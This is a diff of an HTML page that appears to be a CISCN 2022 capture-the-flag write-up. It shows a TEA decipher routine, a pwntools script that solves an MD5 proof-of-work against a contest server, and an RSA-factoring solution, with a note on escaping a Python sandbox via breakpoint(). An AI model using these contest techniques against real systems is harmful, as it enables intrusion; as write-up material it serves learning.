+        v0 <span style="color:#f92672">-=</span> (((v1 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">^</span> (v1 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">5</span>)) <span style="color:#f92672">+</span> v1) <span style="color:#f92672">^</span> (sum <span style="color:#f92672">+</span> key[sum <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">3</span>]);  
+    }  
+    v[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">=</span>v0; v[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">=</span>v1;  
+}  
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()  
+{  
+    <span style="color:#66d9ef">uint32_t</span> v[<span style="color:#ae81ff">10</span>]<span style="color:#f92672">=</span>{
+        <span style="color:#ae81ff">0x9C51DE69</span>, <span style="color:#ae81ff">0xD8C793BF</span>,
+        <span style="color:#ae81ff">0x6346ACA4</span>, 
+        <span style="color:#ae81ff">0xF8D452EA</span>, 
+        <span style="color:#ae81ff">0xA54B10D5</span>, 
+        <span style="color:#ae81ff">0x2F8D8FC6</span>, 
+        <span style="color:#ae81ff">0xC702BB4D</span>, 
+        <span style="color:#ae81ff">0x4725858D</span>, 
+        <span style="color:#ae81ff">0x2B0AA099</span>, 
+        <span style="color:#ae81ff">0x1601D0A6</span>, 
+        };  
+    <span style="color:#66d9ef">uint32_t</span> <span style="color:#66d9ef">const</span> k[<span style="color:#ae81ff">12</span>]<span style="color:#f92672">=</span>{
+        <span style="color:#ae81ff">0x77646464</span>,
+        <span style="color:#ae81ff">0x77776177</span>,
+        <span style="color:#ae81ff">0x61617777</span>,
+        <span style="color:#ae81ff">0x61736473</span>,
+        <span style="color:#ae81ff">0x61776173</span>,
+        <span style="color:#ae81ff">0x61776477</span>,
+        <span style="color:#ae81ff">0x61736161</span>,
+        <span style="color:#ae81ff">0x73736177</span>,
+        <span style="color:#ae81ff">0x77647373</span>,
+        <span style="color:#ae81ff">0x64647364</span>,
+        <span style="color:#ae81ff">0x73617373</span>,
+        <span style="color:#ae81ff">0x61776464</span>
+    };
+    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> r<span style="color:#f92672">=</span><span style="color:#ae81ff">32</span>;
+    printf(<span style="color:#e6db74">&#34;加密后的数据：%u %u</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,v[<span style="color:#ae81ff">0</span>],v[<span style="color:#ae81ff">1</span>]);  
+    decipher(r, v, k);  
+    decipher(r, v <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>, k <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>);  
+    decipher(r, v <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>, k <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>);  
+    decipher(r, v <span style="color:#f92672">+</span> <span style="color:#ae81ff">6</span>, k);  
+    decipher(r, v <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>, k <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>);
+    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">40</span>; i<span style="color:#f92672">++</span>)
+        printf(<span style="color:#e6db74">&#34;%c&#34;</span>, <span style="color:#f92672">*</span>(((<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)v) <span style="color:#f92672">+</span> i));
+    printf(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;  
+}
+<span style="color:#75715e">// d8550a7b7-d0a0d-4f37-b4abc0-0cf93eb3dfd4
+</span></code></pre></div><h2 id="crypto">Crypto</h2>
 <h3 id="diophantine">Diophantine</h3>
 <p>判断是对的，把9除下去解佩尔方程，写for循环提交即可</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
-</span></span><span style="display:flex;"><span>context(os<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;linux&#39;</span>, arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>, log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>)
-</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;39.104.61.18&#34;</span>, <span style="color:#ae81ff">26726</span>)
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib
-</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
-</span></span><span style="display:flex;"><span>dic <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&#39;</span>
-</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;(str + &#34;</span>)
-</span></span><span style="display:flex;"><span>md <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;)&#34;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>decode()
-</span></span><span style="display:flex;"><span>print(md)
-</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34; == &#34;</span>)
-</span></span><span style="display:flex;"><span>ans <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>decode()
-</span></span><span style="display:flex;"><span>print(ans)
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">mdd</span>():
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> a <span style="color:#f92672">in</span> dic:
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> b <span style="color:#f92672">in</span> dic:
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> dic:
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">for</span> d <span style="color:#f92672">in</span> dic:
-</span></span><span style="display:flex;"><span>                    t <span style="color:#f92672">=</span> str(a)<span style="color:#f92672">+</span>str(b)<span style="color:#f92672">+</span>str(c)<span style="color:#f92672">+</span>str(d)<span style="color:#f92672">+</span>md
-</span></span><span style="display:flex;"><span>                    md5 <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>md5(t<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest()
-</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># print(md5[:6])</span>
-</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> md5[<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">5</span>] <span style="color:#f92672">==</span> ans:
-</span></span><span style="display:flex;"><span>                        d <span style="color:#f92672">=</span>str(a)<span style="color:#f92672">+</span>str(b)<span style="color:#f92672">+</span>str(c)<span style="color:#f92672">+</span>str(d)
-</span></span><span style="display:flex;"><span>                        p<span style="color:#f92672">.</span>sendline(d<span style="color:#f92672">.</span>encode())
-</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">return</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>mdd()
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;y&#34;</span>)
-</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;y&#34;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>f <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;./ans.txt&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>)
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> l <span style="color:#f92672">in</span> f<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>):
-</span></span><span style="display:flex;"><span>    x,y<span style="color:#f92672">=</span>l<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39; &#39;</span>)
-</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;x=&#34;</span>,x)
-</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;y=&#34;</span>,y)
-</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;wer&#34;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
-</span></span></code></pre></div><h3 id="easyrsa">EasyRsa</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+context(os<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;linux&#39;</span>, arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>, log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>)
+p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;39.104.61.18&#34;</span>, <span style="color:#ae81ff">26726</span>)
+<span style="color:#f92672">import</span> hashlib
+s <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+dic <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&#39;</span>
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;(str + &#34;</span>)
+md <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;)&#34;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>decode()
+print(md)
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34; == &#34;</span>)
+ans <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>decode()
+print(ans)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">mdd</span>():
+    <span style="color:#66d9ef">for</span> a <span style="color:#f92672">in</span> dic:
+        <span style="color:#66d9ef">for</span> b <span style="color:#f92672">in</span> dic:
+            <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> dic:
+                <span style="color:#66d9ef">for</span> d <span style="color:#f92672">in</span> dic:
+                    t <span style="color:#f92672">=</span> str(a)<span style="color:#f92672">+</span>str(b)<span style="color:#f92672">+</span>str(c)<span style="color:#f92672">+</span>str(d)<span style="color:#f92672">+</span>md
+                    md5 <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>md5(t<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest()
+                <span style="color:#75715e"># print(md5[:6])</span>
+                    <span style="color:#66d9ef">if</span> md5[<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">5</span>] <span style="color:#f92672">==</span> ans:
+                        d <span style="color:#f92672">=</span>str(a)<span style="color:#f92672">+</span>str(b)<span style="color:#f92672">+</span>str(c)<span style="color:#f92672">+</span>str(d)
+                        p<span style="color:#f92672">.</span>sendline(d<span style="color:#f92672">.</span>encode())
+                        <span style="color:#66d9ef">return</span>
+
+mdd()
+
+p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;y&#34;</span>)
+p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;y&#34;</span>)
+
+f <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;./ans.txt&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>)
+<span style="color:#66d9ef">for</span> l <span style="color:#f92672">in</span> f<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>):
+    x,y<span style="color:#f92672">=</span>l<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39; &#39;</span>)
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;x=&#34;</span>,x)
+    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#34;y=&#34;</span>,y)
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;wer&#34;</span>)
+
+p<span style="color:#f92672">.</span>interactive()
+</code></pre></div><h3 id="easyrsa">EasyRsa</h3>
 <p>根据题目信息得到h，由 $\frac h {2<em>g}=r</em>s+\frac{r}{2<em>g}+\frac{s}{2</em>g}$，后两者较小，可以通过爆破得出 r+s 和 r-s，从而得出 s 和 r，进而可以得出 $\phi(n)$，解密得到 flag</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> gmpy2 <span style="color:#f92672">import</span> iroot
-</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Util.number <span style="color:#f92672">import</span> long_to_bytes, inverse
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_rs</span>(cur_rs, h, g):
-</span></span><span style="display:flex;"><span>    rs <span style="color:#f92672">=</span> h <span style="color:#f92672">-</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> g <span style="color:#f92672">*</span> cur_rs
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> rs <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>:
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> rs <span style="color:#f92672">**</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">*</span> cur_rs <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>:
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
-</span></span><span style="display:flex;"><span>    delta <span style="color:#f92672">=</span> iroot(rs <span style="color:#f92672">**</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">*</span> cur_rs, <span style="color:#ae81ff">2</span>)
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> delta[<span style="color:#ae81ff">1</span>]:
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
-</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> (rs <span style="color:#f92672">-</span> delta[<span style="color:#ae81ff">0</span>]) <span style="color:#f92672">//</span> <span style="color:#ae81ff">2</span>
-</span></span><span style="display:flex;"><span>    s <span style="color:#f92672">=</span> (rs <span style="color:#f92672">+</span> delta[<span style="color:#ae81ff">0</span>]) <span style="color:#f92672">//</span> <span style="color:#ae81ff">2</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r, s
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>n<span style="color:#f92672">=</span><span style="color:#ae81ff">22674165844905158260176168026816552467096072570578600242128271855414019546269941158980926383539152088163386486594970550426095813309390851670596901239161501799287825141484239319817091651407345474982377372054888770936964124342265857312847156030175512996932047024846256128852364411361104881876499527373499676800838224118813206681739936743754500898092792230659202349749012386805859665056024946969736506105283735257152266921793786908302315016683954542458869766736987653476629282074870135677126618336504349609949843015699079901471850834309549434049741620451308935825225861067965105407242194092434593658617061001051261986003</span>
-</span></span><span style="display:flex;"><span>e<span style="color:#f92672">=</span><span style="color:#ae81ff">65537</span>
-</span></span><span style="display:flex;"><span>c<span style="color:#f92672">=</span><span style="color:#ae81ff">782836877747818842493334376192707959633875414421119864133181592744303451005021100252453573692816054585303366274224087420041284882899698447861322919543336259986718739329810516986508263800638169206422642491731816114864183191451497206767082965587155423396589137912838842875035557343464065904849661324493244122164082422461425238044593940586748674516957395798642524010290664115814930907318276984939283752745962807878377719292647500596944596051296807946807250542510019416661571456929182119445830050306376509177311647871578247060341177622456756501597305853248802782554576320613573685540342421823987333619169191892620415521</span>
-</span></span><span style="display:flex;"><span>g<span style="color:#f92672">=</span><span style="color:#ae81ff">1834423494494916216123441416584222421978972309717825906841264503350314600090174106582891343187567071177004232569276768024920547950940295765307910633287</span>
-</span></span><span style="display:flex;"><span>h <span style="color:#f92672">=</span> (n <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">//</span> (<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> g)
-</span></span><span style="display:flex;"><span>cur_rs <span style="color:#f92672">=</span> h <span style="color:#f92672">//</span> (<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> g)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> <span style="color:#ae81ff">1</span>:
-</span></span><span style="display:flex;"><span>    cur <span style="color:#f92672">=</span> get_rs(cur_rs, h, g)
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> cur:
-</span></span><span style="display:flex;"><span>        r, s <span style="color:#f92672">=</span> cur
-</span></span><span style="display:flex;"><span>        rs <span style="color:#f92672">=</span> cur_rs
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>
-</span></span><span style="display:flex;"><span>    cur_rs <span style="color:#f92672">-=</span> <span style="color:#ae81ff">1</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>phi <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">*</span> g <span style="color:#f92672">**</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> rs
-</span></span><span style="display:flex;"><span>d <span style="color:#f92672">=</span> inverse(e, phi)
-</span></span><span style="display:flex;"><span>print(long_to_bytes(pow(c, d, n)))
-</span></span></code></pre></div><h2 id="misc">Misc</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> gmpy2 <span style="color:#f92672">import</span> iroot
+<span style="color:#f92672">from</span> Crypto.Util.number <span style="color:#f92672">import</span> long_to_bytes, inverse
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_rs</span>(cur_rs, h, g):
+    rs <span style="color:#f92672">=</span> h <span style="color:#f92672">-</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> g <span style="color:#f92672">*</span> cur_rs
+    <span style="color:#66d9ef">if</span> rs <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>:
+        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
+    <span style="color:#66d9ef">if</span> rs <span style="color:#f92672">**</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">*</span> cur_rs <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>:
+        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
+    delta <span style="color:#f92672">=</span> iroot(rs <span style="color:#f92672">**</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">*</span> cur_rs, <span style="color:#ae81ff">2</span>)
+    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> delta[<span style="color:#ae81ff">1</span>]:
+        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
+    r <span style="color:#f92672">=</span> (rs <span style="color:#f92672">-</span> delta[<span style="color:#ae81ff">0</span>]) <span style="color:#f92672">//</span> <span style="color:#ae81ff">2</span>
+    s <span style="color:#f92672">=</span> (rs <span style="color:#f92672">+</span> delta[<span style="color:#ae81ff">0</span>]) <span style="color:#f92672">//</span> <span style="color:#ae81ff">2</span>
+    <span style="color:#66d9ef">return</span> r, s
+
+
+n<span style="color:#f92672">=</span><span style="color:#ae81ff">22674165844905158260176168026816552467096072570578600242128271855414019546269941158980926383539152088163386486594970550426095813309390851670596901239161501799287825141484239319817091651407345474982377372054888770936964124342265857312847156030175512996932047024846256128852364411361104881876499527373499676800838224118813206681739936743754500898092792230659202349749012386805859665056024946969736506105283735257152266921793786908302315016683954542458869766736987653476629282074870135677126618336504349609949843015699079901471850834309549434049741620451308935825225861067965105407242194092434593658617061001051261986003</span>
+e<span style="color:#f92672">=</span><span style="color:#ae81ff">65537</span>
+c<span style="color:#f92672">=</span><span style="color:#ae81ff">782836877747818842493334376192707959633875414421119864133181592744303451005021100252453573692816054585303366274224087420041284882899698447861322919543336259986718739329810516986508263800638169206422642491731816114864183191451497206767082965587155423396589137912838842875035557343464065904849661324493244122164082422461425238044593940586748674516957395798642524010290664115814930907318276984939283752745962807878377719292647500596944596051296807946807250542510019416661571456929182119445830050306376509177311647871578247060341177622456756501597305853248802782554576320613573685540342421823987333619169191892620415521</span>
+g<span style="color:#f92672">=</span><span style="color:#ae81ff">1834423494494916216123441416584222421978972309717825906841264503350314600090174106582891343187567071177004232569276768024920547950940295765307910633287</span>
+h <span style="color:#f92672">=</span> (n <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">//</span> (<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> g)
+cur_rs <span style="color:#f92672">=</span> h <span style="color:#f92672">//</span> (<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> g)
+
+<span style="color:#66d9ef">while</span> <span style="color:#ae81ff">1</span>:
+    cur <span style="color:#f92672">=</span> get_rs(cur_rs, h, g)
+    <span style="color:#66d9ef">if</span> cur:
+        r, s <span style="color:#f92672">=</span> cur
+        rs <span style="color:#f92672">=</span> cur_rs
+        <span style="color:#66d9ef">break</span>
+    cur_rs <span style="color:#f92672">-=</span> <span style="color:#ae81ff">1</span>
+
+phi <span style="color:#f92672">=</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">*</span> g <span style="color:#f92672">**</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> rs
+d <span style="color:#f92672">=</span> inverse(e, phi)
+print(long_to_bytes(pow(c, d, n)))
+</code></pre></div><h2 id="misc">Misc</h2>
 <h3 id="the-kenorus-arithmetic-classroom-revenge">the Kenoru&rsquo;s Arithmetic Classroom Revenge</h3>
 <p><code>help()</code> 被 ban 了，发现存在类似的命令：<code>breakpoint()</code></p>
 <p>比赛中没截图，放一个本地的测试</p>
@@ -412,6 +412,7 @@
 	</a>
 	
 </figure></p>
+<<<<<<< HEAD
 
 </section>
 
@@ -684,6 +685,280 @@
                 <h2 class="widget-title section-title">Table of contents</h2>
                 
                 <div class="widget--toc">
+=======
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/writeup/">Writeup</a>
+        
+            <a href="/tags/ciscn/">CISCN</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+        <link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.css"integrity="sha384-RZU/ijkSsFbcmivfdRBQDtwuwVqK7GMOw6IMvKyeWL2K5UAlyp6WonmB8m7Jd0Hn"crossorigin="anonymous"
+            ><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.js"integrity="sha384-pK1WpvzWVBQiP0/GjnvRxV4mOb0oxFuyRxJlk6vVw146n3egcN5C925NCP7a7BY8"crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/contrib/auto-render.min.js"integrity="sha384-vZTG03m&#43;2yp6N6BNi5iM4rW4oIwk5DfcNdFfxkk9ZWpDriOkXX8voJBFrAO7MpVl"crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script>
+    window.addEventListener("DOMContentLoaded", () => {
+        renderMathInElement(document.querySelector(`.article-content`), {
+            delimiters: [
+                { left: "$$", right: "$$", display: true },
+                { left: "$", right: "$", display: false },
+                { left: "\\(", right: "\\)", display: false },
+                { left: "\\[", right: "\\]", display: true }
+            ]
+        });})
+</script>
+    
+</article>
+
+    <aside class="related-contents--wrapper">
+    
+    
+        <h2 class="section-title">Related contents</h2>
+        <div class="related-contents">
+            <div class="flex article-list--tile">
+                
+                    
+<article class="has-image">
+    <a href="/post/ciscn-2022-writeup-by-or4nge/">
+        
+        
+            <div class="article-image">
+                <img src="/post/ciscn-2022-writeup-by-or4nge/cover.dd9a1f3516fd809e1fd436da1fd62443_hua298b546d0b49e7ca84fa027f7c430e6_662553_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy" 
+                        data-key="" 
+                        data-hash="md5-3ZofNRb9gJ4f1DbaH9YkQw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">CISCN2022 初赛 Writeup by or4nge</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/post/starctf2022-writeup-by-or4nge/">
+        
+        
+            <div class="article-image">
+                <img src="/post/starctf2022-writeup-by-or4nge/cover.5cd75ed8824fecadd0a744a29cff3c66_hu1b2e905ab849912933a39ffac9637886_354329_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy" 
+                        data-key="" 
+                        data-hash="md5-XNde2IJP7K3Qp0SinP88Zg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">starCTF2022 Writeup by or4nge</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="">
+    <a href="/post/hgame2022-writeup-by-or4nge/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HGAME2022 Writeup by or4nge</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/post/hws2022-writeup/">
+        
+        
+            <div class="article-image">
+                <img src="/post/hws2022-writeup/cover.f811fdb681235510573ab73e97dd00ae_hu31039705144761defd1e1848d4287a81_131160_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy" 
+                        data-key="" 
+                        data-hash="md5-&#43;BH9toEjVRBXOrc&#43;l90Arg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HWS2022冬令营预选赛 Writeup</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/post/cazy-writeup-by-or4nge/">
+        
+        
+            <div class="article-image">
+                <img src="/post/cazy-writeup-by-or4nge/cover.b7dbd864c0b986f185463e4e1e361913_hu2ef483a7301ed58558e75f3e1747bee2_206467_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy" 
+                        data-key="" 
+                        data-hash="md5-t9vYZMC5hvGFRj5OHjYZEw==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">长安战“疫” Writeup</h2>
+        </div>
+    </a>
+</article>
+                
+            </div>
+        </div>
+    
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2022 or4nge
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.5.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
